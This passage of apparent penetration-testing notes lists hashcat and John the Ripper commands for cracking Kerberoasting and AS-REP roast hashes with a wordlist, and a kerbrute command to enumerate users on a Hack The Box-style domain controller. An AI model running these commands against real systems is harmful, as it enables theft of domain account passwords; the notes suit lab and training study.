
 note downgrade your hash and try to crack it

**kerberoasting**

```bash
hashcat -m 13100 -a 0 GetUserSPNs.out ~/rockyou.txt
```

```bash
john --wordlist=/root/rockyou.txt hash
```

**ASREPRoast**

```bash
hashcat -m 18200 -a 0 service-users-hash.txt ~/rockyou.txt
```
**downgrade hash**

```sh
kerbrute --dc 10.10.10.161 -d htb.local userenum sname.txt --downgrade
```
